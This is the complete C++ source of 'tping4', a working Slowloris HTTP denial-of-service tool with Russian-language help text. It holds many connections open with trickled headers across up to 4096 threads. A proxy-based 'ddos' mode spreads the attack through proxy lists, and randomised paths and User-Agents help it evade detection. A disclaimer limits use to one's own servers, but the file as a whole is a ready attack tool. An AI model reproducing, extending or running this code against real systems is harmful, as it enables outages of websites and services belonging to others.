// tping4.cpp — L7 Slowloris. Только для своих серверов.
#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <unistd.h>
#include <atomic>
#include <chrono>
#include <csignal>
#include <fstream>
#include <iostream>
#include <mutex>
#include <random>
#include <string>
#include <thread>
#include <vector>

std::atomic<bool> g_stop{false};
std::atomic<uint64_t> g_alive{0}, g_sent{0}, g_err{0};
void on_signal(int) { g_stop = true; }

struct Cfg {
    std::string url, host, path = "/", proxy_file, ua_file;
    uint16_t port = 80;
    int threads = 256, duration = 0, ka = 5000;
    bool rand_path = false, rand_ua = false, use_proxy = false;
};
struct Proxy { std::string host; uint16_t port; };

std::vector<std::string> g_uas = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1",
};
std::vector<Proxy> g_proxies;
std::mutex g_mtx;

bool parse_url(const std::string& u, Cfg& c) {
    std::string s = u;
    if (s.rfind("http://", 0) == 0) s = s.substr(7);
    else { std::cerr << "[!] только http://\n"; return false; }
    auto sl = s.find('/');
    std::string hp = sl == std::string::npos ? s : s.substr(0, sl);
    c.path = sl == std::string::npos ? "/" : s.substr(sl);
    auto co = hp.find(':');
    c.host = co == std::string::npos ? hp : hp.substr(0, co);
    c.port = co == std::string::npos ? 80 : (uint16_t)std::stoi(hp.substr(co + 1));
    return !c.host.empty();
}

bool resolve(const std::string& h, uint16_t p, sockaddr_in& out) {
    addrinfo hints{}; hints.ai_family = AF_INET; hints.ai_socktype = SOCK_STREAM;
    addrinfo* r = nullptr;
    if (::getaddrinfo(h.c_str(), nullptr, &hints, &r) || !r) return false;
    out = *(sockaddr_in*)r->ai_addr; out.sin_port = htons(p);
    ::freeaddrinfo(r); return true;
}

int connect_to(const sockaddr_in& a) {
    int fd = ::socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;
    if (::connect(fd, (sockaddr*)&a, sizeof(a)) < 0) { ::close(fd); return -1; }
    int one = 1; ::setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
    return fd;
}

bool send_all(int fd, const std::string& d) {
    for (size_t s = 0; s < d.size();) {
        ssize_t n = ::send(fd, d.data() + s, d.size() - s, MSG_NOSIGNAL);
        if (n <= 0) return false;
        s += (size_t)n;
        g_sent += (uint64_t)n;
    }
    return true;
}

std::vector<Proxy> load_proxies(const std::string& f) {
    std::vector<Proxy> v; std::ifstream in(f); std::string l;
    if (!in) { std::cerr << "[!] нет файла " << f << "\n"; return v; }
    while (std::getline(in, l)) {
        if (l.empty() || l[0] == '#') continue;
        auto c = l.find(':'); if (c == std::string::npos) continue;
        try { v.push_back({l.substr(0, c), (uint16_t)std::stoi(l.substr(c + 1))}); } catch (...) {}
    }
    return v;
}

void load_uas(const std::string& f) {
    std::ifstream in(f); if (!in) return;
    std::vector<std::string> v; std::string l;
    while (std::getline(in, l)) if (!l.empty()) v.push_back(l);
    if (!v.empty()) g_uas.swap(v);
}

std::string pick_path(const Cfg& c, std::mt19937& r) {
    if (!c.rand_path) return c.path;
    std::uniform_int_distribution<int> len(4, 16), ch(0, 9);
    static const char* p[] = {"a","b","c","d","e","f","g","h","i","j"};
    std::string s = "/";
    for (int i = len(r); i > 0; --i) s += p[ch(r)];
    return s;
}

std::string pick_ua(std::mt19937& r) {
    if (g_uas.empty()) return "Mozilla/5.0";
    std::uniform_int_distribution<size_t> d(0, g_uas.size() - 1);
    return g_uas[d(r)];
}

void worker(const Cfg& cfg, const sockaddr_in& target) {
    std::mt19937 rng(std::random_device{}() ^ (uint32_t)std::hash<std::thread::id>{}(std::this_thread::get_id()));
    std::uniform_int_distribution<int> jit(0, 500);
    while (!g_stop) {
        int fd = -1;
        if (cfg.use_proxy && !g_proxies.empty()) {
            std::lock_guard<std::mutex> lk(g_mtx);
            std::uniform_int_distribution<size_t> d(0, g_proxies.size() - 1);
            Proxy p = g_proxies[d(rng)];
            sockaddr_in pa{};
            if (!resolve(p.host, p.port, pa)) { g_err++; continue; }
            fd = connect_to(pa);
            if (fd < 0) { g_err++; continue; }
            std::string conn = "CONNECT " + cfg.host + ":" + std::to_string(cfg.port) +
                               " HTTP/1.1\r\nHost: " + cfg.host + "\r\n\r\n";
            if (!send_all(fd, conn)) { ::close(fd); g_err++; continue; }
            char b[256]; ::recv(fd, b, sizeof(b), 0);
        } else {
            fd = connect_to(target);
            if (fd < 0) { g_err++; std::this_thread::sleep_for(std::chrono::milliseconds(500)); continue; }
        }
        std::string head = "GET " + pick_path(cfg, rng) + " HTTP/1.1\r\nHost: " + cfg.host +
                           "\r\nUser-Agent: " + pick_ua(rng) + "\r\nAccept: */*\r\nConnection: keep-alive\r\n";
        if (!send_all(fd, head)) { ::close(fd); g_err++; continue; }
        g_alive++;
        uint64_t seq = 0;
        while (!g_stop) {
            if (!send_all(fd, "X-" + std::to_string(seq++) + ": a\r\n")) break;
            std::this_thread::sleep_for(std::chrono::milliseconds(cfg.ka + jit(rng)));
        }
        ::close(fd);
        g_alive--;
    }
}

void usage(const char* a0) {
    std::cout <<
        "tping4 - L7 slowloris. Только для своих серверов.\n"
        "Usage: " << a0 << " -url http://host[:port]/path [опции]\n"
        "  -url URL     целевой URL (обязательно)\n"
        "  -t N         потоков, 1..4096 (default 256)\n"
        "  -d SEC       длительность сек, 0=бесконечно\n"
        "  -l           синоним -d 0, стоп по Ctrl+C\n"
        "  -ka MS       интервал keep-alive заголовка (default 5000)\n"
        "  -rand-path   случайный URI\n"
        "  -rand-ua     случайный User-Agent\n"
        "  -rand        -rand-path + -rand-ua\n"
        "  -ua FILE     файл со списком User-Agent\n"
        "  -dos         локальный IP (default)\n"
        "  -ddos        через прокси, требует -proxy\n"
        "  -proxy FILE  файл со списком прокси host:port\n"
        "  -table       таблица размеров b/kb/mb/gb/t\n"
        "  -help, -h    эта справка\n"
        "\n"
        "Примеры:\n"
        "  " << a0 << " -url http://127.0.0.1/ -t 500 -d 300 -ka 5000\n"
        "  " << a0 << " -url http://127.0.0.1/ -t 1000 -d 600 -rand\n"
        "  " << a0 << " -url http://127.0.0.1/ -t 300 -d 300 -ddos -proxy proxies.txt\n"
        "  " << a0 << " -url http://127.0.0.1/ -t 200 -l\n"
        "\n"
        "Статистика: alive / sent (байт) / err / t (сек), раз в секунду.\n"
        "Остановка: Ctrl+C или SIGTERM.\n"
        "Ограничения: только HTTP/1.1, без TLS, без raw sockets.\n"
        "Дисклеймер: только для собственных серверов или с письменного разрешения.\n";
}

void print_table() {
    std::cout << "b байты\nkb килобайты\nmb мегабайты\ngb гигабайты\nt терабайты\n";
}

int main(int argc, char** argv) {
    Cfg cfg;
    for (int i = 1; i < argc; ++i) {
        std::string a = argv[i];
        auto nx = [&](const char* n) -> std::string {
            if (i + 1 >= argc) { std::cerr << "[!] " << n << " требует аргумент\n"; std::exit(1); }
            return argv[++i];
        };
        if      (a == "-url")       cfg.url = nx("-url");
        else if (a == "-t")         cfg.threads = std::stoi(nx("-t"));
        else if (a == "-d")         cfg.duration = std::stoi(nx("-d"));
        else if (a == "-l")         cfg.duration = 0;
        else if (a == "-ka")        cfg.ka = std::stoi(nx("-ka"));
        else if (a == "-rand-path") cfg.rand_path = true;
        else if (a == "-rand-ua")   cfg.rand_ua = true;
        else if (a == "-rand")      cfg.rand_path = cfg.rand_ua = true;
        else if (a == "-ua")        cfg.ua_file = nx("-ua");
        else if (a == "-dos")       cfg.use_proxy = false;
        else if (a == "-ddos")      cfg.use_proxy = true;
        else if (a == "-proxy")     cfg.proxy_file = nx("-proxy");
        else if (a == "-table")     { print_table(); return 0; }
        else if (a == "-help" || a == "-h") { usage(argv[0]); return 0; }
        else { std::cerr << "[!] неизвестный флаг: " << a << "\n"; usage(argv[0]); return 1; }
    }
    if (cfg.url.empty()) { usage(argv[0]); return 1; }
    if (cfg.threads < 1 || cfg.threads > 4096) { std::cerr << "[!] -t 1..4096\n"; return 1; }
    if (!parse_url(cfg.url, cfg)) return 1;
    if (cfg.use_proxy) {
        if (cfg.proxy_file.empty()) { std::cerr << "[!] -ddos требует -proxy FILE\n"; return 1; }
        g_proxies = load_proxies(cfg.proxy_file);
        if (g_proxies.empty()) { std::cerr << "[!] список прокси пуст\n"; return 1; }
    }
    if (!cfg.ua_file.empty()) load_uas(cfg.ua_file);

    sockaddr_in target{};
    if (!resolve(cfg.host, cfg.port, target)) { std::cerr << "[!] не резолвится " << cfg.host << "\n"; return 2; }

    std::signal(SIGINT, on_signal);
    std::signal(SIGTERM, on_signal);
    std::signal(SIGPIPE, SIG_IGN);

    std::cerr << "[*] tping4 -> http://" << cfg.host << ":" << cfg.port << cfg.path
              << " t=" << cfg.threads << " ka=" << cfg.ka << "ms"
              << " mode=" << (cfg.use_proxy ? "ddos" : "dos") << "\n";

    std::vector<std::thread> pool;
    for (int i = 0; i < cfg.threads; ++i) pool.emplace_back(worker, std::cref(cfg), std::cref(target));

    auto t0 = std::chrono::steady_clock::now();
    while (!g_stop) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
        auto el = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::steady_clock::now() - t0).count();
        std::cerr << "\r[*] alive=" << g_alive.load() << " sent=" << g_sent.load() << "B err=" << g_err.load()
                  << " t=" << el << "s   " << std::flush;
        if (cfg.duration > 0 && el >= cfg.duration) { g_stop = true; break; }
    }
    std::cerr << "\n[*] stopping...\n";
    for (auto& t : pool) t.join();
    std::cerr << "[*] done. alive=" << g_alive.load() << " sent=" << g_sent.load() << "B err=" << g_err.load() << "\n";
    return 0;
}